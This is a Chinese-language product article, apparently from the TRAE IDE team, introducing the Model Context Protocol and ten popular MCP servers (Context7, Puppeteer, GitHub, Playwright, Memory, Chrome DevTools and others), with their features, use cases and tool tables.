<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/297095766119461c9bd501892861da0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980716&amp;x-signature=Hky7QlUgjXATH3DYdCJZq8FITWg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0"><strong>MCP 介绍</strong></h2>
<p>Model Context Protocol (MCP) 是一种协议，它允许大型语言模型（LLMs）访问自定义的工具和服务。TRAE 中的智能体作为 MCP 客户端可以选择向 MCP Server 发起请求，以使用它们提供的工具。你可以自行添加 MCP Server，并添加到<strong>自定义的智能体</strong>中来使用。</p>
<p>在 TRAE IDE 中，MCP Server 支持三种传输类型：stdio 传输、SSE 传输、Streamable HTTP 传输。 </p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/611d37bd6b1f4a079191fdb1101a3044~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980716&amp;x-signature=Y5TJwdr05imOO6LqmJmNnPiS4%2Fc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1"><strong>概览</strong></h2>
<p>以下是在 TRAE IDE 中的 10款热门 MCP Server。</p>

















































<table><thead><tr><th><strong>MCP Server</strong></th><th><strong>简介</strong></th></tr></thead><tbody><tr><td>Context7 </td><td>Context7 MCP Server 提供面向 AI 模型的文档检索与上下文注入能力，可实时获取官方文档的最新内容和指定版本的代码示例。 </td></tr><tr><td>Puppeteer </td><td>Puppeteer MCP Server 提供浏览器自动化能力，使 LLM 能够在真实的浏览器环境中与网页进行交互、截取屏幕截图，并执行 JavaScript。 </td></tr><tr><td>Sequential Thinking</td><td>Sequential Thinking MCP Server 通过结构化的思维流程，为动态且具反思性的问题求解提供工具。</td></tr><tr><td>GitHub </td><td>GitHub MCP Server 基于 GitHub API，允许 LLM 直接访问并管理 GitHub 上的仓库、代码、用户、Issue 与 Pull Request。 </td></tr><tr><td>Figma AI Bridge </td><td>Figma AI Bridge MCP Server 针对设计到实现阶段，提供查看、分析和提取 Figma 设计数据的能力，帮助 LLM 理解设计的结构并辅助精确还原设计稿中内容。 </td></tr><tr><td>Playwright</td><td>Playwright MCP Server 基于 Playwright 提供浏览器自动化能力，使 LLM 能够在真实的浏览器环境中与网页交互、截取屏幕截图、生成测试代码、抓取网页内容，并执行 JavaScript。 </td></tr><tr><td>Memory</td><td>Memory MCP Server 通过本地知识图谱（Knowledge Graph）持久化记忆，使 LLM 能够跨会话保留用户相关的上下文信息。</td></tr><tr><td>Excel</td><td>Excel MCP Server 用于读取 Microsoft Excel 文件中的电子表格数据，或向其中写入数据。 </td></tr><tr><td>File System</td><td>File System MCP Server 提供基于文件系统的文件读取能力。 </td></tr><tr><td>Chrome DevTools MCP</td><td>Chrome DevTools MCP 让 AI 智能体能够直接控制并深入检查 Chrome 浏览器。它向 AI 开放了 Chrome DevTools 的全部能力，使其能更精准、高效地完成网页自动化测试、故障排查及性能分析等任务。 </td></tr></tbody></table>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96ceb3a01e5949d984220b0b98696895~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980716&amp;x-signature=5sB57QVm5SK%2BXa2G4nPnDXEgWGs%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>MCP 具体介绍</strong></h2>
<h3 data-id="heading-3"><strong>Context7</strong></h3>
<p>Context7 MCP Server 提供面向 AI 模型的文档检索与上下文注入能力，可实时获取官方文档的最新内容和指定版本的代码示例，确保模型在回答问题、生成代码或提供方案时，基于最新的官方信息。</p>
<h4 data-id="heading-4"><strong>核心功能</strong></h4>
<ul>
<li>
<p><strong>官方文档实时检索：</strong> 直接从官方文档源获取内容，而非依赖模型训练阶段的静态知识，支持检索最新或指定版本的 API 参考与示例代码。</p>
</li>
<li>
<p><strong>文档上下文注入：</strong> 将检索到的文档内容直接注入到 LLM 的上下文中，使模型在“已阅读官方文档”的前提下进行回答或生成代码。</p>
</li>
<li>
<p><strong>库与文档的标准化解析：</strong> 将模糊的库名映射为 Context7 可识别的库 ID，确保后续可准确查询到目标文档。 </p>
</li>
</ul>
<h4 data-id="heading-5"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>API 开发：</strong> 获取最新框架或 SDK 的 API 定义与示例，避免误用已废弃或不存在的接口。</p>
</li>
<li>
<p><strong>配置与脚本编写：</strong> 编写 Cloudflare Workers、中间件，或构建、部署相关配置时，确保配置项和字段名称与官方文档中的内容一致。</p>
</li>
<li>
<p><strong>代码生成与重构：</strong> 在生成或重构代码时，确保实现方式符合当前的官方推荐做法，减少因文档过时导致的返工。</p>
</li>
<li>
<p><strong>问题排查与最佳实践查询：</strong> 基于官方文档获取错误说明、使用限制和推荐方案，提高问题定位与解决的准确性。 </p>
</li>
</ul>
<h4 data-id="heading-6"><strong>工具</strong></h4>
<p>Context7 MCP Server 为 LLM 提供以下可调用的工具： </p>

















<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>resolve-library-id</td><td>将通用的库名称解析为 Context7 兼容的库 ID。</td></tr><tr><td>query-docs</td><td>使用 Context7 兼容的库 ID 获取指定库的文档。</td></tr></tbody></table>
<h3 data-id="heading-7"><strong>Puppeteer</strong></h3>
<p>Puppeteer MCP Server 提供浏览器自动化能力，使 LLM 能够在真实的浏览器环境中与网页进行交互、截取屏幕截图，并执行 JavaScript。</p>
<h4 data-id="heading-8"><strong>核心功能</strong></h4>
<ul>
<li>
<p><strong>浏览器控制自动化：</strong> 在真实浏览器中进行页面导航，支持点击、悬停、表单填写等基础网页交互操作，模拟用户行为。</p>
</li>
<li>
<p><strong>JavaScript 执行：</strong> 直接在浏览器控制台中执行 JavaScript，既能读取当前页面的各类状态信息，也能完成计算任务或触发页面的内置逻辑。</p>
</li>
<li>
<p><strong>页面捕获：</strong> 对整个页面或指定元素进行截图，为 AI 模型提供直观、可验证的页面渲染结果。</p>
</li>
<li>
<p><strong>控制台日志监控：</strong> 获取浏览器控制台的输出信息，包括页面脚本产生的所有 console 日志，辅助调试与问题定位。 </p>
</li>
</ul>
<h4 data-id="heading-9"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>网页功能验证与调试：</strong> 验证网页交互功能是否符合预期效果，同时结合捕获的控制台日志，辅助开发人员快速定位并调试前端问题。</p>
</li>
<li>
<p><strong>页面状态与渲染检查：</strong> 通过截图功能确认网页的 UI 渲染效果是否达标，同时可对比不同操作前后的页面变化，验证操作对页面的影响。 </p>
</li>
</ul>
<h4 data-id="heading-10"><strong>工具</strong></h4>
<p>Puppeteer MCP Server 为 LLM 提供以下可调用的工具：</p>





































<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>puppeteer_navigate</td><td>在浏览器中导航到任意 URL。</td></tr><tr><td>puppeteer_screenshot</td><td>对整个页面或指定元素进行截图。</td></tr><tr><td>puppeteer_click</td><td>点击页面中的元素。 </td></tr><tr><td>puppeteer_hover</td><td>将鼠标悬停在页面元素上。</td></tr><tr><td>puppeteer_fill</td><td>填写输入框。</td></tr><tr><td>puppeteer_select</td><td>选择带有 SELECT 标签的元素。</td></tr><tr><td>puppeteer_evaluate</td><td>在浏览器控制台中执行 JavaScript。</td></tr></tbody></table>
<h3 data-id="heading-11"><strong>Sequential Thinking</strong></h3>
<p>Sequential Thinking MCP Server 通过结构化的思维流程，为动态且具反思性的问题求解提供工具。</p>
<h4 data-id="heading-12"><strong>核心功能</strong></h4>
<ul>
<li>
<p>将复杂问题拆解为可管理的步骤。</p>
</li>
<li>
<p>随着理解加深，对思路进行修订和完善。</p>
</li>
<li>
<p>在不同的推理路径之间进行分支探索。</p>
</li>
<li>
<p>动态调整整体思考步骤的数量。</p>
</li>
<li>
<p>生成并验证解决方案假设。 </p>
</li>
</ul>
<h4 data-id="heading-13"><strong>使用场景</strong></h4>
<ul>
<li>
<p>拆解复杂问题，并按步骤逐步解决。</p>
</li>
<li>
<p>需要预留修改空间的规划与设计过程。</p>
</li>
<li>
<p>可能需要中途调整方向的分析任务。</p>
</li>
<li>
<p>一开始难以完全明确问题范围的场景。</p>
</li>
<li>
<p>需要在多个步骤中持续保持上下文的任务。</p>
</li>
<li>
<p>需要过滤无关信息、聚焦关键信息的情况。 </p>
</li>
</ul>
<h4 data-id="heading-14"><strong>工具</strong></h4>
<p>Sequential Thinking MCP Server 为 LLM 提供以下可调用的工具：</p>













<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>sequential_thinking</td><td>为问题求解和分析提供细致的、逐步推进的思考过程。</td></tr></tbody></table>
<h3 data-id="heading-15"><strong>GitHub</strong></h3>
<p>GitHub MCP Server 基于 GitHub API，允许 LLM 直接访问并管理 GitHub 上的仓库、代码、用户、Issue 与 Pull Request。</p>
<p>该 MCP Server 支持的所有操作<strong>仅作用于</strong> GitHub 上的远程资源：所有文件操作均发生在 GitHub 仓库中，通过 Commit 与 Pull Request 提交，<strong>不会读取或修改用户本地的文件系统。</strong></p>
<h4 data-id="heading-16"><strong>核心功能</strong></h4>
<ul>
<li>
<p><strong>仓库与文件管理：</strong> 支持全面管理代码库，包括仓库的创建、Fork、搜索及分支管理；同时具备精细的文件操作功能，允许直接读取内容、创建或更新文件以及批量推送代码。</p>
</li>
<li>
<p><strong>Issue 追踪：</strong> 聚焦于项目进度的管理与协同，支持对 Issue 进行创建、筛选、状态更新及评论。</p>
</li>
<li>
<p><strong>Pull Request 协作：</strong> 涵盖代码合并的全生命周期，从发起 Pull Request、查看变更详情、同步分支最新改动，到最终合并代码。</p>
</li>
<li>
<p><strong>代码评审与信息检索：</strong> 支持发起和管理代码评审，获取评审意见；同时提供强大的搜索能力，可快速定位代码片段、用户或相关评论。 </p>
</li>
</ul>
<h4 data-id="heading-17"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>AI 辅助代码开发：</strong> 自动执行从代码修改、分支创建到变更提交的全流程。在遵循版本控制规范的前提下，实现开发需求的快速落地与代码历史的清晰记录。</p>
</li>
<li>
<p><strong>自动化协作工作流：</strong> 全面接管 Issue 追踪与 Pull Request 管理。自动完成任务创建、上下文补充、评审及分支合并，减少人工操作成本。</p>
</li>
<li>
<p><strong>项目调研与分析：</strong> 深度解析仓库的架构、代码逻辑及变更历史。结合全局检索能力，快速定位核心信息并梳理项目脉络，然后生成调研报告。</p>
</li>
<li>
<p><strong>智能的仓库管理：</strong> 将 AI 作为团队协作的一部分，执行重复性的 GitHub 操作，提升个人或团队的开发效率。</p>
</li>
</ul>
<h4 data-id="heading-18"><strong>工具</strong></h4>
<p>GitHub MCP Server 为 LLM 提供以下可调用的工具：</p>

















































































































<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>create_or_update_file </td><td>在仓库中创建或更新单个文件。 </td></tr><tr><td>push_files </td><td>在一次提交中推送多个文件。 </td></tr><tr><td>search_repositories </td><td>搜索 GitHub 仓库。 </td></tr><tr><td>create_repository </td><td>创建新的 GitHub 仓库。 </td></tr><tr><td>get_file_contents </td><td>获取文件或目录内容。 </td></tr><tr><td>create_issue   </td><td>创建新的 Issue。 </td></tr><tr><td>create_pull_request </td><td>创建新的 Pull Request。 </td></tr><tr><td>fork_repository </td><td>Fork 一个仓库。 </td></tr><tr><td>create_branch </td><td>创建新分支。 </td></tr><tr><td>list_issues</td><td>列出并筛选仓库 Issue。 </td></tr><tr><td>update_issue </td><td>更新已有 Issue。 </td></tr><tr><td>add_issue_comment </td><td>为 Issue 添加评论。 </td></tr><tr><td>search_code </td><td>在 GitHub 上搜索代码。 </td></tr><tr><td>search_issues </td><td>搜索 Issue 和 Pull Request。 </td></tr><tr><td>search_users </td><td>搜索 GitHub 用户。 </td></tr><tr><td>list_commits </td><td>获取仓库某个分支的提交记录。 </td></tr><tr><td>get_issue </td><td>获取仓库中指定 Issue 的内容。 </td></tr><tr><td>get_pull_request </td><td>获取指定 Pull Request 的详情。 </td></tr><tr><td>list_pull_requests</td><td>列出并筛选仓库的 Pull Request。 </td></tr><tr><td>create_pull_request_review </td><td>为某个 Pull Request 创建评审。 </td></tr><tr><td>merge_pull_request </td><td>合并 Pull Request。 </td></tr><tr><td>get_pull_request_files </td><td>获取某个 Pull Request 中变更的文件列表。 </td></tr><tr><td>get_pull_request_status </td><td>获取某个 Pull Request 的所有状态检查的汇总状态。 </td></tr><tr><td>update_pull_request_branch</td><td>使用 base 分支的最新更改更新某个 Pull Request 分支（等同于 GitHub 中的 “Update branch” 按钮）。 </td></tr><tr><td>get_pull_request_comments </td><td>获取某个 Pull Request 的评审评论。 </td></tr><tr><td>get_pull_request_reviews </td><td>获取某个 Pull Request 的评审记录。 </td></tr></tbody></table>
<h3 data-id="heading-19"><strong>Figma AI Bridge</strong></h3>
<p>Figma AI Bridge MCP Server 针对设计到实现阶段，提供查看、分析和提取 Figma 设计数据的能力，帮助 LLM 理解你的设计思路并辅助你精确还原设计稿中的内容。</p>
<h4 data-id="heading-20"><strong>核心功能</strong></h4>
<ul>
<li>
<p><strong>Figma 设计解析：</strong> 获取 Figma 文件或指定节点的布局与结构信息。在无法直接获得节点 ID 的情况下，仍可分析整个设计文件。</p>
</li>
<li>
<p><strong>设计资源下载：</strong> 根据图像或图标节点 ID，自动下载设计中使用的 SVG / PNG 图片，便于在实现阶段直接复用设计资产。</p>
</li>
<li>
<p><strong>为 AI 提供可理解的设计上下文：</strong> 将 Figma 中的设计信息转换为 AI 可消费的数据，为后续的代码生成、样式还原或布局分析提供依据。 </p>
</li>
</ul>
<h4 data-id="heading-21"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>设计还原与前端实现：</strong> 辅助 AI 理解设计的结构，提高实际实现与设计稿的一致性。</p>
</li>
<li>
<p><strong>设计资产自动提取：</strong> 自动下载图标、图片等资源，减少手动操作。</p>
</li>
<li>
<p><strong>设计到代码的自动转换：</strong> 为代码生成提供设计思路相关的准确上下文，作为从设计到实现链路中的关键一环。</p>
</li>
<li>
<p><strong>Agent 驱动的 UI 分析与实现：</strong> 让 AI 在理解设计思路的基础上分析 UI 布局并思考实现方案。 </p>
</li>
</ul>
<h4 data-id="heading-22"><strong>工具</strong></h4>
<p>Figma AI Bridge MCP Server 为 LLM 提供以下可调用的工具：</p>

















<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>download_figma_images</td><td>根据图像或图标节点的 ID，下载 Figma 文件中使用的 SVG 和 PNG 图片。</td></tr><tr><td>get_figma_data</td><td>当无法获取节点 ID 时，用于获取整个 Figma 文件的布局信息。同时支持获取某个 Figma 文件或文件中指定节点的相关信息。</td></tr></tbody></table>
<h3 data-id="heading-23"><strong>Playwright</strong></h3>
<p>Playwright MCP Server 基于 Playwright 提供浏览器自动化能力，使 LLM 能够在真实的浏览器环境中与网页交互、截取屏幕截图、生成测试代码、抓取网页内容，并执行 JavaScript。</p>
<p>相较于基础浏览器自动化，它进一步扩展了测试代码生成、网络请求控制与多设备模拟等能力，适合更复杂、结构化的网页测试。 </p>
<h4 data-id="heading-24"><strong>核心功能</strong></h4>
<ul>
<li>
<p><strong>自动化浏览器控制</strong></p>
<p>支持页面导航、点击、悬停、表单填写、拖拽、键盘操作等交互。</p>
<p>覆盖普通 DOM 以及 iframe 场景。</p>
</li>
<li>
<p><strong>代码生成与测试录制（Codegen）</strong></p>
<p>支持开启代码生成会话，记录浏览器操作。</p>
<p>自动生成可复用的 Playwright 测试代码文件。</p>
</li>
<li>
<p><strong>页面内容捕获</strong></p>
<p>对页面或指定元素进行截图。</p>
<p>提取页面可见文本或 HTML 内容。</p>
<p>支持将页面保存为 PDF。</p>
</li>
<li>
<p><strong>JavaScript 执行与控制台调试</strong></p>
<p>在浏览器上下文中执行 JavaScript。</p>
<p>获取并过滤浏览器控制台日志，用于调试与分析。</p>
</li>
<li>
<p><strong>网络请求与响应控制</strong></p>
<p>主动发起 HTTP 请求。</p>
<p>支持等待并断言特定网络响应，便于接口级验证。</p>
</li>
<li>
<p><strong>多设备与浏览器环境模拟</strong></p>
<p>调整浏览器视口大小或使用设备预设。</p>
<p>内置 143+ 设备模型，提供正确的 User-Agent 与触控模拟，支持自定义 User-Agent。 </p>
</li>
</ul>
<h4 data-id="heading-25"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>自动化测试与测试代码生成</strong></p>
<p>执行由 AI 驱动的网页测试并录制真实操作，生成 Playwright 测试脚本。</p>
<p>回归测试、端到端测试。</p>
</li>
<li>
<p><strong>复杂网页交互验证</strong></p>
<p>验证页面在不同设备、分辨率和 User-Agent 下的交互逻辑。</p>
<p>处理 iframe、文件上传、标签页切换等复杂交互。</p>
</li>
<li>
<p><strong>请求级调试与验证</strong></p>
<p>同时验证前端交互与后端接口响应。</p>
<p>适合需要精确控制请求与响应的调试场景。</p>
</li>
<li>
<p><strong>Agent 驱动的网页操作与信息采集</strong></p>
<p>抓取可见内容或结构化 HTML。</p>
<p>在真实浏览器上下文中完成端到端任务。 </p>
</li>
</ul>
<h4 data-id="heading-26"><strong>工具</strong></h4>
<p>​Playwright MCP Server 为 LLM 提供以下可调用的工具：</p>












































































































































<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>start_codegen_session  </td><td>开始一个新的代码生成会话，用于记录 Playwright 操作。  </td></tr><tr><td>end_codegen_session  </td><td>结束代码生成会话并生成测试文件。  </td></tr><tr><td>get_codegen_session  </td><td>获取关于代码生成会话的信息。  </td></tr><tr><td>clear_codegen_session  </td><td>清除代码生成会话而不生成测试文件。  </td></tr><tr><td>playwright_navigate  </td><td>导航到一个 URL。  </td></tr><tr><td>playwright_screenshot  </td><td>对当前页面或特定元素进行截图。  </td></tr><tr><td>playwright_click  </td><td>点击页面上的元素。  </td></tr><tr><td>playwright_iframe_click  </td><td>点击 iframe 中的元素。  </td></tr><tr><td>playwright_iframe_fill  </td><td>在页面中的 iframe 里填充某个元素。 </td></tr><tr><td>playwright_fill  </td><td>填写输入字段。  </td></tr><tr><td>playwright_select  </td><td>使用 Select 标签选择页面上的元素。  </td></tr><tr><td>playwright_hover  </td><td>悬停在页面的元素上。</td></tr><tr><td>playwright_upload_file  </td><td>将文件上传到页面中的 input[type="file"] 元素。</td></tr><tr><td>playwright_evaluate  </td><td>在浏览器控制台执行 JavaScript。  </td></tr><tr><td>playwright_console_logs  </td><td>检索浏览器的控制台日志（带过滤选项）。  </td></tr><tr><td>playwright_resize  </td><td>使用自定义尺寸或设备预设来调整浏览器视口大小。支持 143 种以上的设备预设，包括 iPhone、iPad、各类 Android 设备以及桌面浏览器，并提供正确的 User-Agent 和触控（Touch）模拟。</td></tr><tr><td>playwright_close  </td><td>关闭浏览器并释放所有资源。  </td></tr><tr><td>playwright_get  </td><td>执行 HTTP GET 请求。  </td></tr><tr><td>playwright_post  </td><td>执行 HTTP POST 请求。  </td></tr><tr><td>playwright_put  </td><td>执行 HTTP PUT 请求。  </td></tr><tr><td>playwright_patch  </td><td>执行 HTTP PATCH 请求。  </td></tr><tr><td>playwright_delete  </td><td>执行 HTTP DELETE 请求。  </td></tr><tr><td>playwright_expect_response  </td><td>请求 Playwright 开始等待某个 HTTP 响应。该工具只会启动等待操作，但不会阻塞或等待该操作完成。  </td></tr><tr><td>playwright_assert_response  </td><td>等待并校验之前已发起的 HTTP 响应等待操作。  </td></tr><tr><td>playwright_custom_user_agent  </td><td>为浏览器设置自定义 User-Agent。  </td></tr><tr><td>playwright_get_visible_text  </td><td>获取当前页面的可见文本内容。  </td></tr><tr><td>playwright_get_visible_html  </td><td>获取当前页面的 HTML 内容。默认情况下，输出结果会移除所有 
</td></tr><tr><td>playwright_go_back  </td><td>在浏览器历史中后退。  </td></tr><tr><td>playwright_go_forward  </td><td>在浏览器历史中前进。  </td></tr><tr><td>playwright_drag</td><td>将元素拖动到目标位置。  </td></tr><tr><td>playwright_press_key  </td><td>按下键盘键。  </td></tr><tr><td>playwright_save_as_pdf  </td><td>将当前页面保存为 PDF 文件。  </td></tr><tr><td>playwright_click_and_switch_tab  </td><td>点击一个链接并切换到新打开的标签页。  </td></tr></tbody></table>
<h3 data-id="heading-27"><strong>Memory</strong></h3>
<p>Memory MCP Server 通过本地知识图谱（Knowledge Graph）持久化记忆，使 LLM 能够跨会话保留用户相关的上下文信息。</p>
<p>它的<strong>核心目标是将零散、非结构化的用户信息转化为可结构化、可查询、可演化的长期记忆，并在后续对话中被持续维护和利用。</strong></p>
<p>Memory MCP Server 采用知识图谱作为记忆模型，由以下三类核心概念共同构成一个可扩展的记忆网络： </p>





















<table><thead><tr><th><strong>概念</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>Entity</td><td>知识图谱中的主要节点，表示一个具体、可识别的对象。</td></tr><tr><td>Relation</td><td>用于定义 Entity 之间的有向连接。它们始终以主动语态存储，用于描述 Entity 之间的交互方式或相互关系。</td></tr><tr><td>Observation</td><td>关于某个 Entity 的离散信息片段，可不断新增、修改或删除。</td></tr></tbody></table>
<h4 data-id="heading-28"><strong>核心功能</strong></h4>
<ul>
<li>
<p><strong>结构化、持久化记忆：</strong> 将用户相关信息以 Entity-Relation-Observation 的形式存储。存储的信息会跨会话持续存在，不随单次对话结束而丢失。</p>
</li>
<li>
<p><strong>记忆的增量演化：</strong> 支持向已有 Entity 不断添加新的 Observation，以及创建和调整 Entity 之间的 Relation。</p>
</li>
<li>
<p><strong>查询与维护记忆：</strong> 支持按条件搜索节点。可读取整个知识图谱，便于调试和理解记忆。</p>
</li>
<li>
<p><strong>清理记忆：</strong> 支持删除指定 Entity 及其关联的 Relation；支持删除指定 Observation 或 Relation，避免记忆污染。 </p>
</li>
</ul>
<h4 data-id="heading-29"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>跨会话用户记忆：</strong> 记住你的偏好、背景、项目状态等信息，从而在后续对话中提供更连续、一致的体验。</p>
</li>
<li>
<p><strong>Agent 的长期状态管理：</strong> 让 AI Agent 拥有可演化的“内部状态”，支撑长期任务与多轮协作。</p>
</li>
<li>
<p><strong>复杂上下文的结构化管理：</strong> 避免将大量历史信息堆叠在 Prompt 中，提高上下文可控性与可维护性。</p>
</li>
<li>
<p><strong>可解释的 AI 记忆系统：</strong> 通过知识图谱，清晰展示模型所记住的信息，便于调试和人工干预。 </p>
</li>
</ul>
<h4 data-id="heading-30"><strong>工具</strong></h4>
<p>​Memory MCP Server 为 LLM 提供以下可调用的工具：</p>













































<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>create_entities</td><td>在知识图谱中创建多个新 Entity。</td></tr><tr><td>create_relations</td><td>在 Entity 之间创建多条新关系。</td></tr><tr><td>add_observations</td><td>向已有 Entity 添加新 Observation。</td></tr><tr><td>delete_entities</td><td>删除 Entity 及其所有 Relation。</td></tr><tr><td>delete_observations</td><td>从 Entity 中删除指定的 Observation。</td></tr><tr><td>delete_relations</td><td>从知识图谱中删除指定的 Relation。</td></tr><tr><td>read_graph</td><td>读取整个知识图谱。</td></tr><tr><td>search_nodes</td><td>根据查询条件搜索节点。</td></tr><tr><td>open_nodes</td><td>按名称获取指定节点。</td></tr></tbody></table>
<h3 data-id="heading-31"><strong>Excel</strong></h3>
<p>Excel MCP Server 用于读取 Microsoft Excel 文件中的电子表格数据，或向其中写入数据。 </p>
<h4 data-id="heading-32"><strong>核心功能</strong></h4>
<ul>
<li>
<p>读取 / 写入文本值</p>
</li>
<li>
<p>读取 / 写入公式</p>
</li>
<li>
<p>创建新的工作表</p>
</li>
<li>
<p>(仅 Windows) 实时编辑</p>
</li>
<li>
<p>(仅 Windows) 为工作表截图 </p>
</li>
</ul>
<h4 data-id="heading-33"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>自动化数据处理：</strong> 批量读取、整理和写入 Excel 数据，自动生成结构化表格与计算公式。</p>
</li>
<li>
<p><strong>报表生成：</strong> 自动生成分析报表或业务数据表。</p>
</li>
<li>
<p><strong>办公自动化与 Agent 流程：</strong> 作为 AI Agent 操作办公文件的重要接口，可以与其他 MCP Server 协同使用。</p>
</li>
<li>
<p><strong>可视化结果校验（Windows）：</strong> 通过截图方式确认表格的布局与内容是否符合预期。 </p>
</li>
</ul>
<h4 data-id="heading-34"><strong>工具</strong></h4>





































<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>excel_describe_sheets</td><td>列出指定 Excel 文件中的所有工作表信息。</td></tr><tr><td>excel_read_sheet</td><td>以分页方式读取 Excel 工作表中的数据。</td></tr><tr><td>excel_screen_capture</td><td>（仅 Windows） 以分页方式为 Excel 工作表截图。</td></tr><tr><td>excel_write_to_sheet</td><td>向 Excel 工作表写入数据。</td></tr><tr><td>excel_create_table</td><td>在 Excel 工作表中创建表格。</td></tr><tr><td>excel_copy_sheet</td><td>将现有工作表复制为一个新的工作表。</td></tr><tr><td>excel_format_range</td><td>为 Excel 工作表中的单元格设置样式格式。</td></tr></tbody></table>
<h3 data-id="heading-35"><strong>File System</strong></h3>
<p>File System MCP Server 提供基于文件系统的文件读取能力。</p>
<h4 data-id="heading-36"><strong>主要功能</strong></h4>
<ul>
<li>
<p>通过 MCP 实现无缝的文件读取。</p>
</li>
<li>
<p>命令行式的 API Key 配置。 </p>
</li>
</ul>
<h4 data-id="heading-37"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>文档与配置读取：</strong> 在对话或自动化流程中直接读取项目文档、配置文件或说明文件，为模型提供准确的上下文。</p>
</li>
<li>
<p><strong>代码与资源分析：</strong> 读取源代码、脚本或资源文件，辅助进行代码理解、审查或问题定位。</p>
</li>
<li>
<p><strong>工作流集成：</strong> 将文件读取能力集成到现有流程中，减少手动复制粘贴文件内容，提高自动化水平。 </p>
</li>
</ul>
<h4 data-id="heading-38"><strong>工具</strong></h4>
<p>File System MCP Server 为 LLM 提供以下可调用的工具： </p>













<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>read-file </td><td>从文件系统读取文件。 </td></tr></tbody></table>
<h3 data-id="heading-39"><strong>Chrome DevTools MCP</strong></h3>
<p>Chrome DevTools MCP 让 AI 智能体能够直接控制并深入检查 Chrome 浏览器。它向 AI 开放了 Chrome DevTools 的全部能力，使其能更精准、高效地完成网页自动化测试、故障排查及性能分析等任务。</p>
<h4 data-id="heading-40"><strong>主要功能</strong></h4>
<ul>
<li><strong>浏览器自动化：</strong> 通过 Chrome DevTools Protocol 在 Chrome 中自动化各类操作，并自动等待结果。</li>
<li><strong>性能洞察：</strong> 使用 Chrome DevTools 记录性能追踪（traces）数据，并提取可执行的性能优化策略。</li>
<li><strong>浏览器调试：</strong> 分析网络请求、截取屏幕截图，并检查浏览器控制台信息。</li>
</ul>
<h4 data-id="heading-41"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>浏览器相关操作自动化：</strong> 由 AI 直接控制 Chrome 来执行页面交互（导航、点击、输入、等待等），实现稳定、可复现的自动化流程。</p>
</li>
<li>
<p><strong>前端调试与问题排查：</strong> 访问控制台日志、网络请求和页面状态，辅助定位前端错误、接口异常等问题。</p>
</li>
<li>
<p><strong>性能分析与优化：</strong> 记录并分析性能追踪数据，获取性能洞察和 Core Web Vitals 指标，用于发现并处理页面的性能瓶颈。 </p>
</li>
</ul>
<h4 data-id="heading-42"><strong>工具</strong></h4>
<p>​Chrome DevTools MCP 为 LLM 提供以下可调用的工具：</p>





















































































































<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>click</td><td>点击指定的元素。</td></tr><tr><td>close_page</td><td>根据页面索引关闭页面。最后一个打开的页面不能被关闭。</td></tr><tr><td>drag</td><td>将一个元素拖拽到另一个元素上。</td></tr><tr><td>emulate</td><td>在选中的页面上模拟多种特性。</td></tr><tr><td>evaluate_script</td><td>在当前选中的页面中执行一个 JavaScript 函数，并将响应以 JSON 形式返回，使返回值可被 JSON 序列化。</td></tr><tr><td>fill</td><td>在输入框或文本区域中输入文本，或从  元素中选择一个选项。</td></tr><tr><td>fill_form</td><td>一次性填写多个表单元素。</td></tr><tr><td>get_console_message</td><td>根据 ID 获取一条控制台消息。你可以通过调用 list_console_messages 获取所有消息</td></tr><tr><td>get_network_request</td><td>根据可选的 reqid 获取一条网络请求；如果省略，则返回 DevTools Network 面板中当前选中的请求。</td></tr><tr><td>handle_dialog</td><td>如果打开了浏览器对话框，使用该命令进行处理。</td></tr><tr><td>hover</td><td>将鼠标悬停在提供的元素上。</td></tr><tr><td>list_console_messages</td><td>列出自上次导航以来，当前选中页面的所有控制台消息。</td></tr><tr><td>list_network_requests</td><td>列出自上次导航以来，当前选中页面的所有网络请求。</td></tr><tr><td>list_pages</td><td>获取浏览器中打开的页面列表。</td></tr><tr><td>navigate_page</td><td>将当前选中的页面导航到一个 URL。</td></tr><tr><td>new_page</td><td>创建一个新的页面。</td></tr><tr><td>performance_analyze_insight</td><td>针对追踪记录结果中高亮显示的某个 Performance Insight，提供更详细的信息。</td></tr><tr><td>performance_start_trace</td><td>在选中的页面上开始性能追踪记录。该记录可用于查找性能问题并获取改进页面性能的洞察，同时还会报告页面的 Core Web 